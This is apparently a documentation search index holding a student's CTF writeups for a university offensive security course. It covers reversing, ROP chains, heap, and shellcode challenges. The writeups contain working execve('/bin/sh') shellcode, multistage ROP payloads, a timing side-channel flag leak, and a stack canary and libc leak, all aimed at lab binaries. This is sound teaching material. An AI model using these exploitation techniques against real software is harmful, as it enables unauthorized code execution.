{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"ODC This repository contains the solution for various challenges taken during the Offensive and Defensive Cybersecurity Course at Politecnico di Milano along with their writeups. Challenges are divided into categories, each one of them has its own folder. Each challenge contains a README.md file with the description of the challenge and the writeup. Categories Shellcode Reverse Engineering Mitigation Bypass ROP Heap Exploitation Symbolic Exeuction and Fuzzing Race Condition Serialization XSS Final CTF","title":"Home"},{"location":"#odc","text":"This repository contains the solution for various challenges taken during the Offensive and Defensive Cybersecurity Course at Politecnico di Milano along with their writeups. Challenges are divided into categories, each one of them has its own folder. Each challenge contains a README.md file with the description of the challenge and the writeup.","title":"ODC"},{"location":"#categories","text":"Shellcode Reverse Engineering Mitigation Bypass ROP Heap Exploitation Symbolic Exeuction and Fuzzing Race Condition Serialization XSS","title":"Categories"},{"location":"#final-ctf","text":"","title":"Final CTF"},{"location":"heap/","text":"Heap Exploration This set of challenges is about Heap Exploration. The goal is to understand how the heap works and how to exploit it. I used How2Heap as a reference for the challenges. Challenges (in rough order of subjective difficulty): fastbin_attack pkm playground","title":"Heap Exploration"},{"location":"heap/#heap-exploration","text":"This set of challenges is about Heap Exploration. The goal is to understand how the heap works and how to exploit it. I used How2Heap as a reference for the challenges. Challenges (in rough order of subjective difficulty): fastbin_attack pkm playground","title":"Heap Exploration"},{"location":"mitigations/","text":"Mitigation Bypass This set of challenges is about Mitigation Bypass. The goal is to bypass a set of mitigations (ASLR, PIE, canaries, PTR protections, etc.) to exploit a vulnerable binary. Challenges (in rough order of subjective difficulty): leakers gonna_leak aslr ptr_protection","title":"Mitigation Bypass"},{"location":"mitigations/#mitigation-bypass","text":"This set of challenges is about Mitigation Bypass. The goal is to bypass a set of mitigations (ASLR, PIE, canaries, PTR protections, etc.) to exploit a vulnerable binary. Challenges (in rough order of subjective difficulty): leakers gonna_leak aslr ptr_protection","title":"Mitigation Bypass"},{"location":"race/","text":"Race Condition This set of challenges is about race condition. Challenges (in rough order of subjective difficulty): aart metarace pybook","title":"Race Condition"},{"location":"race/#race-condition","text":"This set of challenges is about race condition. Challenges (in rough order of subjective difficulty): aart metarace pybook","title":"Race Condition"},{"location":"reversing/","text":"Reverse Engineering This set of challenges is about reverse engineering. The goal is to understand the logic of a binary and find a flag or a key. Challenges (in rough order of subjective difficulty): revmem revmemp crackme keycheck_baby leaked_license","title":"Reverse Engineering"},{"location":"reversing/#reverse-engineering","text":"This set of challenges is about reverse engineering. The goal is to understand the logic of a binary and find a flag or a key. Challenges (in rough order of subjective difficulty): revmem revmemp crackme keycheck_baby leaked_license","title":"Reverse Engineering"},{"location":"reversing/crackme/","text":"crackme This challenge is a simple crackme that asks for a flag and checks if it is correct. Disassembling and reversing with Ghidra int main(int argc,char **argv) { code *pcVar1; int iVar2; signal(5,catch_function); if (argc < 2) { puts(\"USAGE: ./crackme FLAG!\"); return 1; } input = argv[1]; pcVar1 = (code *)swi(3); iVar2 = (*pcVar1)(); return iVar2; } The swi(3) is doing an int3 to trigger a SIGTRAP signal. This is used to prevent the program from being debugged. We can patch this out with a hex editor or gdb. Or we can just reverse engineer the catch_function and see what it does. This is what the flag_cracker.c program does. In fact, it is a very simple function: the input is xored with a key and the result is compared with another array of bytes. So we need just to xor the key array with the result bytes array to get the flag. The complete cracking program is in flag_cracker.c .","title":"crackme"},{"location":"reversing/crackme/#crackme","text":"This challenge is a simple crackme that asks for a flag and checks if it is correct.","title":"crackme"},{"location":"reversing/crackme/#disassembling-and-reversing-with-ghidra","text":"int main(int argc,char **argv) { code *pcVar1; int iVar2; signal(5,catch_function); if (argc < 2) { puts(\"USAGE: ./crackme FLAG!\"); return 1; } input = argv[1]; pcVar1 = (code *)swi(3); iVar2 = (*pcVar1)(); return iVar2; } The swi(3) is doing an int3 to trigger a SIGTRAP signal. This is used to prevent the program from being debugged. We can patch this out with a hex editor or gdb. Or we can just reverse engineer the catch_function and see what it does. This is what the flag_cracker.c program does. In fact, it is a very simple function: the input is xored with a key and the result is compared with another array of bytes. So we need just to xor the key array with the result bytes array to get the flag. The complete cracking program is in flag_cracker.c .","title":"Disassembling and reversing with Ghidra"},{"location":"reversing/keycheck_baby/","text":"keycheck_baby Disassembly and decompilation This is the simplified version of the function that is checking the flag: void check(char[32] flag) { unsigned char magic0[] = { ... }; unsigned char magic1[] = { ... }; if(flag[0...4] != \"flag{\") { return 0; } if(flag[30] != '}') { return 0; } for(int i = 0; i < 0xd; i++) { if(\"babuzz\"[i%6] ^ flag[i+5] != magic0[i]) { return 0; } } char acc = -0x45; for(i = 0; i < 0xc; i++) { acc = acc + str[i]; if(acc!= magic1[i]) return -1; } return 1; } Solution We have three(+1) checks to pass: 1) The flag must start with flag{ 2) The flag must end with } 3) The flag must satisfy the equation babuzz[i%6] ^ flag[i+5] == magic0[i] for i from 0 to 0xd , then we have that flag[i+5] == babuzz[i%6] ^ magic0[i] for i from 0 to 0xd . The last check is a bit trickier since there is accumulation involved. The idea is the following: Find the first: flag[0] = magic1[0] - (-0x45); Update j: j = j + flag[0]; Find the second: flag[1] = magic1[1] - j; ... This last step can be translated in the following cracking snippet: char j = -0x45; for(int i = 0xd; i < 0xc + 0xd; i++) { flag[i+5] = magic1[i-0xd] - j; j = j + flag[i+5]; } The complete cracking program is in flag_cracker.c .","title":"keycheck_baby"},{"location":"reversing/keycheck_baby/#keycheck_baby","text":"","title":"keycheck_baby"},{"location":"reversing/keycheck_baby/#disassembly-and-decompilation","text":"This is the simplified version of the function that is checking the flag: void check(char[32] flag) { unsigned char magic0[] = { ... }; unsigned char magic1[] = { ... }; if(flag[0...4] != \"flag{\") { return 0; } if(flag[30] != '}') { return 0; } for(int i = 0; i < 0xd; i++) { if(\"babuzz\"[i%6] ^ flag[i+5] != magic0[i]) { return 0; } } char acc = -0x45; for(i = 0; i < 0xc; i++) { acc = acc + str[i]; if(acc!= magic1[i]) return -1; } return 1; }","title":"Disassembly and decompilation"},{"location":"reversing/keycheck_baby/#solution","text":"We have three(+1) checks to pass: 1) The flag must start with flag{ 2) The flag must end with } 3) The flag must satisfy the equation babuzz[i%6] ^ flag[i+5] == magic0[i] for i from 0 to 0xd , then we have that flag[i+5] == babuzz[i%6] ^ magic0[i] for i from 0 to 0xd . The last check is a bit trickier since there is accumulation involved. The idea is the following: Find the first: flag[0] = magic1[0] - (-0x45); Update j: j = j + flag[0]; Find the second: flag[1] = magic1[1] - j; ... This last step can be translated in the following cracking snippet: char j = -0x45; for(int i = 0xd; i < 0xc + 0xd; i++) { flag[i+5] = magic1[i-0xd] - j; j = j + flag[i+5]; } The complete cracking program is in flag_cracker.c .","title":"Solution"},{"location":"reversing/leaked_license/","text":"leaked_license The binary generates a serial code from a license generated via a quite complex algorithm involving xor and shifts. Objective: find the serial code associated to another license, 726cfc2d26c6defedb06562199f5c7d0da4f4930 . The license generated is of course always the same, so we have just the serial code associated to that license, not the one we need. The code it's a mess and renaming the variables doesn't help much. Solution The obvious way to solve the challenge is to reverse the algorithm and find the serial code associated to the license we have. But this is very hard. The fastest and easiest solution is to use GDB to set at runtime the bytes of the license to the ones we have and then let the program generate the serial code for us. In this way we don't need to reverse the algorithm. 1) Set a breakpoint to an instruction in the outer loop outside the nested loops: b *0x5555555552c0 . This instruction is the local_50 = DAT_00104_020; in the decompiled code, disassembled as qword ptr [rbp - 0x48] . From Ghidra we know that the license chunk is right before that variable in the stack so at the address rbp - 0x50 2) Use c to continue the execution until the breakpoint is reached 3) At each iteration of the loop modify the license chunk with the right bytes with set *(char **)($rbp - 0x50) = 0x726cfc2d (the first chunk of the license, in this case) 4) Continue from point 2 until the end of the loop At the end of the loop the output will be the serial code we are looking for.","title":"leaked_license"},{"location":"reversing/leaked_license/#leaked_license","text":"The binary generates a serial code from a license generated via a quite complex algorithm involving xor and shifts. Objective: find the serial code associated to another license, 726cfc2d26c6defedb06562199f5c7d0da4f4930 . The license generated is of course always the same, so we have just the serial code associated to that license, not the one we need. The code it's a mess and renaming the variables doesn't help much.","title":"leaked_license"},{"location":"reversing/leaked_license/#solution","text":"The obvious way to solve the challenge is to reverse the algorithm and find the serial code associated to the license we have. But this is very hard. The fastest and easiest solution is to use GDB to set at runtime the bytes of the license to the ones we have and then let the program generate the serial code for us. In this way we don't need to reverse the algorithm. 1) Set a breakpoint to an instruction in the outer loop outside the nested loops: b *0x5555555552c0 . This instruction is the local_50 = DAT_00104_020; in the decompiled code, disassembled as qword ptr [rbp - 0x48] . From Ghidra we know that the license chunk is right before that variable in the stack so at the address rbp - 0x50 2) Use c to continue the execution until the breakpoint is reached 3) At each iteration of the loop modify the license chunk with the right bytes with set *(char **)($rbp - 0x50) = 0x726cfc2d (the first chunk of the license, in this case) 4) Continue from point 2 until the end of the loop At the end of the loop the output will be the serial code we are looking for.","title":"Solution"},{"location":"reversing/revmem/","text":"revmem The binary generates a flag that is compared with the user input using strcmp . Easy way ltrace ./revmem whatever Will print the strcmp arguments, so we can just copy the flag. \"Hard\" way Very similar to the last part of keycheck_baby . This solution is in flag_cracker.c . Alternative solution Using Ghidra we can see that the function strncmp in the main is called at the offset 0x22d within the code segment. Using gdb we can set a breakpoint at the address 0x55555555522d and see the parameters passed to the function.","title":"revmem"},{"location":"reversing/revmem/#revmem","text":"The binary generates a flag that is compared with the user input using strcmp .","title":"revmem"},{"location":"reversing/revmem/#easy-way","text":"ltrace ./revmem whatever Will print the strcmp arguments, so we can just copy the flag.","title":"Easy way"},{"location":"reversing/revmem/#hard-way","text":"Very similar to the last part of keycheck_baby . This solution is in flag_cracker.c .","title":"\"Hard\" way"},{"location":"reversing/revmem/#alternative-solution","text":"Using Ghidra we can see that the function strncmp in the main is called at the offset 0x22d within the code segment. Using gdb we can set a breakpoint at the address 0x55555555522d and see the parameters passed to the function.","title":"Alternative solution"},{"location":"reversing/revmemp/","text":"revmemp The program generates a flag with this function: char * generate_flag(void) { int random_idx; char *flag; int i; flag = (char *)malloc(0x21); srand(0x1337); for (i = 0; i < 0x21; i = i + 1) { check_something(); random_idx = rand(); flag[i] = PTR_DAT_00104060[random_idx % 0x539]; } return flag; } As we can see, the flag is generated with a random number generator seeded with 0x1337 and the random number is used to select a character from a table of 0x539 characters. The issue of this function is that the random number generator is seeded with a constant value, so the flag is always the same and we can easily find it by just executing the snippet above and printing the flag. This is what the flag_cracker.c file does.","title":"revmemp"},{"location":"reversing/revmemp/#revmemp","text":"The program generates a flag with this function: char * generate_flag(void) { int random_idx; char *flag; int i; flag = (char *)malloc(0x21); srand(0x1337); for (i = 0; i < 0x21; i = i + 1) { check_something(); random_idx = rand(); flag[i] = PTR_DAT_00104060[random_idx % 0x539]; } return flag; } As we can see, the flag is generated with a random number generator seeded with 0x1337 and the random number is used to select a character from a table of 0x539 characters. The issue of this function is that the random number generator is seeded with a constant value, so the flag is always the same and we can easily find it by just executing the snippet above and printing the flag. This is what the flag_cracker.c file does.","title":"revmemp"},{"location":"rop/","text":"Return Oriented Programming (ROP) This set of challenges is about Return Oriented Programming (ROP). The goal is to craft a ROP chain to exploit a vulnerable binary. Challenges (in rough order of subjective difficulty): easyrop emptyspaces ropasaurusrex byteflip positiveleak","title":"Return Oriented Programming (ROP)"},{"location":"rop/#return-oriented-programming-rop","text":"This set of challenges is about Return Oriented Programming (ROP). The goal is to craft a ROP chain to exploit a vulnerable binary. Challenges (in rough order of subjective difficulty): easyrop emptyspaces ropasaurusrex byteflip positiveleak","title":"Return Oriented Programming (ROP)"},{"location":"rop/emptyspaces/","text":"emptyspaces Disassemble and Decompilation As we can see the input string is 64 bytes long and the read is reading 137, thus we have a BO. The problem is that after the overflow of the buffer and the sEBP we have just 137-64-8=65 bytes that are not enough for a rop chain where we first read the string '/bin/sh' and then call execve. Solution The idea is to use a multistage rop chain exploit. First we use a rop chain to set the RDX register to 0x1000 (arbitrary high value) and then we return to the read in the main. In this way we are rewriting the exact same buffer but we have more bytes for the second stage. First Stage call_main = [ b'A'*72, pop_rdx, p64(0x1000), main, ] This stage is 96 bytes long, so it fits the 137 bytes read. Second Stage read_execve_payload = [ b'A'*88, pop_rdi, p64(0x0), pop_rsi, bss_addr, xor_eax_eax_syscall, pop_rax, p64(0x3b), pop_rdi, bss_addr, pop_rdx_pop_rsi, p64(0x0), p64(0x0), syscall ] This stage fits the 0x1000 bytes we have set in the RDX register in the first stage. We overflow the buffer and overwrite the sRIP of the read() function. Basically the read() function in the main instead of returning to the main itself, it returns to the pop_rdi gadget. Then the chain begins, a read syscall is called to read the string '/bin/sh' in the bss section, then the execve syscall is called to execute the string '/bin/sh'. Note that we have two different syscall gadgets. This is because the xor_eax_eax_syscall gadget is used to set the RAX register to 0x0, while the last syscall gadget is a terminator syscall, meaning that it will never return. The complete exploit is in script.py .","title":"emptyspaces"},{"location":"rop/emptyspaces/#emptyspaces","text":"","title":"emptyspaces"},{"location":"rop/emptyspaces/#disassemble-and-decompilation","text":"As we can see the input string is 64 bytes long and the read is reading 137, thus we have a BO. The problem is that after the overflow of the buffer and the sEBP we have just 137-64-8=65 bytes that are not enough for a rop chain where we first read the string '/bin/sh' and then call execve.","title":"Disassemble and Decompilation"},{"location":"rop/emptyspaces/#solution","text":"The idea is to use a multistage rop chain exploit. First we use a rop chain to set the RDX register to 0x1000 (arbitrary high value) and then we return to the read in the main. In this way we are rewriting the exact same buffer but we have more bytes for the second stage.","title":"Solution"},{"location":"rop/emptyspaces/#first-stage","text":"call_main = [ b'A'*72, pop_rdx, p64(0x1000), main, ] This stage is 96 bytes long, so it fits the 137 bytes read.","title":"First Stage"},{"location":"rop/emptyspaces/#second-stage","text":"read_execve_payload = [ b'A'*88, pop_rdi, p64(0x0), pop_rsi, bss_addr, xor_eax_eax_syscall, pop_rax, p64(0x3b), pop_rdi, bss_addr, pop_rdx_pop_rsi, p64(0x0), p64(0x0), syscall ] This stage fits the 0x1000 bytes we have set in the RDX register in the first stage. We overflow the buffer and overwrite the sRIP of the read() function. Basically the read() function in the main instead of returning to the main itself, it returns to the pop_rdi gadget. Then the chain begins, a read syscall is called to read the string '/bin/sh' in the bss section, then the execve syscall is called to execute the string '/bin/sh'. Note that we have two different syscall gadgets. This is because the xor_eax_eax_syscall gadget is used to set the RAX register to 0x0, while the last syscall gadget is a terminator syscall, meaning that it will never return. The complete exploit is in script.py .","title":"Second Stage"},{"location":"rop/positiveleak/","text":"positiveleak Setup We are provided with a binary and the libc. Using file we can see that the binary is a 64-bit ELF. With checksec we get: Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Since NX is enabled we can't execute shellcode from the stack, so we have to use ROP. With patchelf we can replace the libc with the one provided. patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc-2.35.so positiveleak Reversing the binary Using IDA we can see that the binary lets us choice between 2 options: Add Numbers Print Numbers Add Numbers printf(\"How many would you add?\"); printf(\"> \"); length = get_int(); stack = alloca(16 * (4 * length + 23) / 16); printf(\"#> \"); num = get_int(); for (i = 0; i < length && num >= 0; ++i) { stack[i] = num; printf(\"[%d]#> \", i); num = get_int(); } for (j = 0; j <= i; ++j) numbers[j] += stack[j]; This function asks for how many numbers we want to add, and then asks for each number. The numbers are stored in a global array of size 200. The global array numbers stores long long values (8 bytes). The vulnerability is in the fact that this function use alloca() to make space for the temporary numbers to store, but the space is allocated for integers (4 bytes) instead of long long (8 bytes). In fact is called alloca(16 * (4*num + 23) / 16) . The multiplication and the division are there to round up the number to the nearest multiple of 16 (stack alignment). Please note that this function ask for an extra number before the loop. Print Numbers Just prints the 200 numbers stored in the global array (1600 bytes). Exploitation We need to leak the libc base address and then we can, for example, use a one_gadget to get a shell. Leak libc We can use the vulnerability in the Add Numbers function to leak the libc base address. In fact if we add for example 6 numbers, the 5th number will be placed in the stack where the iteration counter is stored, then if we put for example 0x10ffffffff , the counter will be set to 0x10, then in the global array will be placed 16 long longs from the stack, among which there will be the canary and a libc address. We choose to add 6 numbers, when we add the first 5 numbers the situation will be: pwndbg> x/30gx 0x7ffc9fb3cf00 // Stack Dump 0x7ffc9fb3cf00: 0x0000000000000001 0x0000000000000002 // The first 2 numbers (1 and 2) 0x7ffc9fb3cf10: 0x0000000000000003 0x0000000000000004 // The second 2 numbers (3 and 4) 0x7ffc9fb3cf20: 0x0000000000000005 0x000000049fb3cf50 // The 5th number (5) and the counter (0x00000004) When the next number is added, the counter will be overwritten, if the next number is 0x10ffffffff, the situation will be: pwndbg> x/30gx 0x7ffc9fb3cf00 0x7ffc9fb3cf00: 0x0000000000000001 0x0000000000000002 0x7ffc9fb3cf10: 0x0000000000000003 0x0000000000000004 0x7ffc9fb3cf20: 0x0000000000000005 0x00000010ffffffff // <- The core of is here 0x7ffc9fb3cf30: 0x0000000600000012 [something] // The first 6 is the size that we choose. As we can see the counter i is set to 0x10. Since 0x10 > 0x6 the loop will end and the 16 long longs will be copied from the stack to the global array, then we can print the array and we will get the canary and a libc address. Get-a-shell [[TODO]]","title":"positiveleak"},{"location":"rop/positiveleak/#positiveleak","text":"","title":"positiveleak"},{"location":"rop/positiveleak/#setup","text":"We are provided with a binary and the libc. Using file we can see that the binary is a 64-bit ELF. With checksec we get: Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Since NX is enabled we can't execute shellcode from the stack, so we have to use ROP. With patchelf we can replace the libc with the one provided. patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc-2.35.so positiveleak","title":"Setup"},{"location":"rop/positiveleak/#reversing-the-binary","text":"Using IDA we can see that the binary lets us choice between 2 options: Add Numbers Print Numbers","title":"Reversing the binary"},{"location":"rop/positiveleak/#add-numbers","text":"printf(\"How many would you add?\"); printf(\"> \"); length = get_int(); stack = alloca(16 * (4 * length + 23) / 16); printf(\"#> \"); num = get_int(); for (i = 0; i < length && num >= 0; ++i) { stack[i] = num; printf(\"[%d]#> \", i); num = get_int(); } for (j = 0; j <= i; ++j) numbers[j] += stack[j]; This function asks for how many numbers we want to add, and then asks for each number. The numbers are stored in a global array of size 200. The global array numbers stores long long values (8 bytes). The vulnerability is in the fact that this function use alloca() to make space for the temporary numbers to store, but the space is allocated for integers (4 bytes) instead of long long (8 bytes). In fact is called alloca(16 * (4*num + 23) / 16) . The multiplication and the division are there to round up the number to the nearest multiple of 16 (stack alignment). Please note that this function ask for an extra number before the loop.","title":"Add Numbers"},{"location":"rop/positiveleak/#print-numbers","text":"Just prints the 200 numbers stored in the global array (1600 bytes).","title":"Print Numbers"},{"location":"rop/positiveleak/#exploitation","text":"We need to leak the libc base address and then we can, for example, use a one_gadget to get a shell.","title":"Exploitation"},{"location":"rop/positiveleak/#leak-libc","text":"We can use the vulnerability in the Add Numbers function to leak the libc base address. In fact if we add for example 6 numbers, the 5th number will be placed in the stack where the iteration counter is stored, then if we put for example 0x10ffffffff , the counter will be set to 0x10, then in the global array will be placed 16 long longs from the stack, among which there will be the canary and a libc address. We choose to add 6 numbers, when we add the first 5 numbers the situation will be: pwndbg> x/30gx 0x7ffc9fb3cf00 // Stack Dump 0x7ffc9fb3cf00: 0x0000000000000001 0x0000000000000002 // The first 2 numbers (1 and 2) 0x7ffc9fb3cf10: 0x0000000000000003 0x0000000000000004 // The second 2 numbers (3 and 4) 0x7ffc9fb3cf20: 0x0000000000000005 0x000000049fb3cf50 // The 5th number (5) and the counter (0x00000004) When the next number is added, the counter will be overwritten, if the next number is 0x10ffffffff, the situation will be: pwndbg> x/30gx 0x7ffc9fb3cf00 0x7ffc9fb3cf00: 0x0000000000000001 0x0000000000000002 0x7ffc9fb3cf10: 0x0000000000000003 0x0000000000000004 0x7ffc9fb3cf20: 0x0000000000000005 0x00000010ffffffff // <- The core of is here 0x7ffc9fb3cf30: 0x0000000600000012 [something] // The first 6 is the size that we choose. As we can see the counter i is set to 0x10. Since 0x10 > 0x6 the loop will end and the 16 long longs will be copied from the stack to the global array, then we can print the array and we will get the canary and a libc address.","title":"Leak libc"},{"location":"rop/positiveleak/#get-a-shell","text":"[[TODO]]","title":"Get-a-shell"},{"location":"rop/ropasaurusrex/","text":"ropasaurusrex Setup In this challenge we are provided a binary, the libc and the loader so we have to use patchelf. patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc-2.35.so ropasaurusrex Using file we can see that the binary is a 32-bit ELF. Using checksec we get: Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8047000) Since NX is enabled we can't execute shellcode from the stack, so we have to use ROP. In particular since the binary is 32-bit we have to use a different ROP strategy w.r.t. easyrop or emptyspaces . Also, even if the binary is not PIE, we have to leak the address of a function in libc to calculate the base address of libc (if we need it) because of ASLR. Solution The idea is to rejump to the main to restart the binary (we do not have a loop and we need it to leak the address of a libc function). We use cyclic to find the offset of the return address on the stack. cyclic -n 4 300 Then we send that as a payload to the binary and we get a segfault. It crashes on 0x626161b ('kaab'). With cyclic -n 4 -l 0x626161b we get the offset of the return address on the stack: 140. We can chain parameters to call a write to call write(got.read) now that we have a loop. Since the binary is not PIE we know the address of the GOT. We can find the address of GOT using Ghidra PTR_read for example using Show References.","title":"ropasaurusrex"},{"location":"rop/ropasaurusrex/#ropasaurusrex","text":"","title":"ropasaurusrex"},{"location":"rop/ropasaurusrex/#setup","text":"In this challenge we are provided a binary, the libc and the loader so we have to use patchelf. patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc-2.35.so ropasaurusrex Using file we can see that the binary is a 32-bit ELF. Using checksec we get: Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8047000) Since NX is enabled we can't execute shellcode from the stack, so we have to use ROP. In particular since the binary is 32-bit we have to use a different ROP strategy w.r.t. easyrop or emptyspaces . Also, even if the binary is not PIE, we have to leak the address of a function in libc to calculate the base address of libc (if we need it) because of ASLR.","title":"Setup"},{"location":"rop/ropasaurusrex/#solution","text":"The idea is to rejump to the main to restart the binary (we do not have a loop and we need it to leak the address of a libc function). We use cyclic to find the offset of the return address on the stack. cyclic -n 4 300 Then we send that as a payload to the binary and we get a segfault. It crashes on 0x626161b ('kaab'). With cyclic -n 4 -l 0x626161b we get the offset of the return address on the stack: 140. We can chain parameters to call a write to call write(got.read) now that we have a loop. Since the binary is not PIE we know the address of the GOT. We can find the address of GOT using Ghidra PTR_read for example using Show References.","title":"Solution"},{"location":"shellcode/","text":"Shellcode Crafting This set of challenges is about shellcode crafting. The goal is to craft a shellcode that satisfies a set of constraints or that executes in non-standard environments. Challenges (in rough order of subjective difficulty): backtoshell onlyreadwrite gimme3bytes tiny multistage lost_in_memory server benchmarking","title":"Shellcode Crafting"},{"location":"shellcode/#shellcode-crafting","text":"This set of challenges is about shellcode crafting. The goal is to craft a shellcode that satisfies a set of constraints or that executes in non-standard environments. Challenges (in rough order of subjective difficulty): backtoshell onlyreadwrite gimme3bytes tiny multistage lost_in_memory server benchmarking","title":"Shellcode Crafting"},{"location":"shellcode/backtoshell/","text":"backtoshell Very simple challenge. It basically reads the shellcode from stdin and executes it. We only need to pass the correct shellcode. mov rdi, rax add rdi, 16 mov rax, 0x3b syscall .string \"/bin/sh\" RAX register contains the address of the shellcode (returned by the read syscall). We need to add 16 to it to get the address of the string \"/bin/sh\" (which is the first argument of the execve syscall). Then we can call execve. Note that RSI and RDX are already set to 0, so we don't need to set them. The complete exploit is in script.py .","title":"backtoshell"},{"location":"shellcode/backtoshell/#backtoshell","text":"Very simple challenge. It basically reads the shellcode from stdin and executes it. We only need to pass the correct shellcode. mov rdi, rax add rdi, 16 mov rax, 0x3b syscall .string \"/bin/sh\" RAX register contains the address of the shellcode (returned by the read syscall). We need to add 16 to it to get the address of the string \"/bin/sh\" (which is the first argument of the execve syscall). Then we can call execve. Note that RSI and RDX are already set to 0, so we don't need to set them. The complete exploit is in script.py .","title":"backtoshell"},{"location":"shellcode/benchmarking/","text":"benchmarking_service For this challenge both a binary and a wrapper.py script is provided. The binary is pretty simple, it reads a shellcode from stdin and executes it. The wrapper.py create a subprocess that runs the binary and sends the input to it, then prints the time it took to execute the shellcode. The challenge is that the subprocess has no stdout nor stderr, so we cannot execute any shellcode that prints something nor spawn a shell. What syscall can we use? Using seccomp-tools dump ./benchmarking_service this is what we get: line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005 0004: 0x15 0x00 0x06 0xffffffff if (A != 0xffffffff) goto 0011 0005: 0x15 0x04 0x00 0x00000000 if (A == read) goto 0010 0006: 0x15 0x03 0x00 0x00000001 if (A == write) goto 0010 0007: 0x15 0x02 0x00 0x00000002 if (A == open) goto 0010 0008: 0x15 0x01 0x00 0x00000023 if (A == nanosleep) goto 0010 0009: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL So we can use read , write , open and nanosleep . But write is useless since we have no stdout. Solution The idea is to do a standard open-read exploit to read from the /chall/flag file. And then we can do a binary search on the time it takes to execute the shellcode to find the flag character by character. We could also use nanosleep to sleep for a certain amount of time that is proportional to the flag character, but I found that it was quite complex to setup the parameters for the nanosleep syscall, since we have to deal with structs. Binary Search Approach At the end of a standard open-read shellcode I added this: movzx eax, BYTE PTR [rsi+%d] cmp al, %d jne .L2 jmp .L3 .L4: // char == flag[count] add DWORD PTR [rbp-4], 1 .L3: cmp DWORD PTR [rbp-4], 0x10000000 jle .L4 .L2: cmp al, %d jg .L5 jmp .L6 .L7: add DWORD PTR [rbp-4], 1 .L5: // char > flag[count] cmp DWORD PTR [rbp-4], 0x20000000 jle .L7 .L6: // char < flag[count] As we an see in this snippet there are %d placeholders. In fact this shellcode is sent many times to the service. The first %d refers to the count variable, that is the index of the character in the flag string. The other two are an integer representing an ASCII character. Based on the time required to execute this shellcode we get if the character we are trying is greater or less than the flag character. Then we can do a binary search to find the flag character. I used loops to simulate the nanosleep syscall. The complete exploit is in script.py .","title":"benchmarking_service"},{"location":"shellcode/benchmarking/#benchmarking_service","text":"For this challenge both a binary and a wrapper.py script is provided. The binary is pretty simple, it reads a shellcode from stdin and executes it. The wrapper.py create a subprocess that runs the binary and sends the input to it, then prints the time it took to execute the shellcode. The challenge is that the subprocess has no stdout nor stderr, so we cannot execute any shellcode that prints something nor spawn a shell.","title":"benchmarking_service"},{"location":"shellcode/benchmarking/#what-syscall-can-we-use","text":"Using seccomp-tools dump ./benchmarking_service this is what we get: line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005 0004: 0x15 0x00 0x06 0xffffffff if (A != 0xffffffff) goto 0011 0005: 0x15 0x04 0x00 0x00000000 if (A == read) goto 0010 0006: 0x15 0x03 0x00 0x00000001 if (A == write) goto 0010 0007: 0x15 0x02 0x00 0x00000002 if (A == open) goto 0010 0008: 0x15 0x01 0x00 0x00000023 if (A == nanosleep) goto 0010 0009: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL So we can use read , write , open and nanosleep . But write is useless since we have no stdout.","title":"What syscall can we use?"},{"location":"shellcode/benchmarking/#solution","text":"The idea is to do a standard open-read exploit to read from the /chall/flag file. And then we can do a binary search on the time it takes to execute the shellcode to find the flag character by character. We could also use nanosleep to sleep for a certain amount of time that is proportional to the flag character, but I found that it was quite complex to setup the parameters for the nanosleep syscall, since we have to deal with structs.","title":"Solution"},{"location":"shellcode/benchmarking/#binary-search-approach","text":"At the end of a standard open-read shellcode I added this: movzx eax, BYTE PTR [rsi+%d] cmp al, %d jne .L2 jmp .L3 .L4: // char == flag[count] add DWORD PTR [rbp-4], 1 .L3: cmp DWORD PTR [rbp-4], 0x10000000 jle .L4 .L2: cmp al, %d jg .L5 jmp .L6 .L7: add DWORD PTR [rbp-4], 1 .L5: // char > flag[count] cmp DWORD PTR [rbp-4], 0x20000000 jle .L7 .L6: // char < flag[count] As we an see in this snippet there are %d placeholders. In fact this shellcode is sent many times to the service. The first %d refers to the count variable, that is the index of the character in the flag string. The other two are an integer representing an ASCII character. Based on the time required to execute this shellcode we get if the character we are trying is greater or less than the flag character. Then we can do a binary search to find the flag character. I used loops to simulate the nanosleep syscall. The complete exploit is in script.py .","title":"Binary Search Approach"},{"location":"shellcode/gimme3bytes/","text":"gimme3bytes It reads 3 bytes from stdin and executes them as shellcode. The idea is to run a multi-stage shellcode, where the first stage is a small shellcode that call the syscall read to read the second stage from stdin. The second stage is the actual shellcode that will be executed. First Stage (3 bytes) pop rdx syscall RAX: already set to 0x0a (syscall number for read ) RDI: already set to 0x0 (stdin) RSI: already set to the buffer address RDX: set using pop rdx . Why so? Because at that point the stack contains a large number that can be used as a buffer size Second Stage (25 bytes) Main idea: execve(RDI -> \"/bin/sh\", RSI = argv -> NULL, RDX = envp -> NULL) nop nop nop mov rdi, rsi add rdi, 0x19 mov rax, 0x3b xor rsi, rsi xor rdx, rdx syscall .string \"/bin/sh\" Note: The first three nop s are there since the RIP after the first stage is set at the end of the buffer and cannot be changed. With the three nop s we push the second stage three bytes forward right where the RIP will be set and then mov rdi, rsi will be the first instruction executed. RDI: set to the buffer address + 25, to point to the string 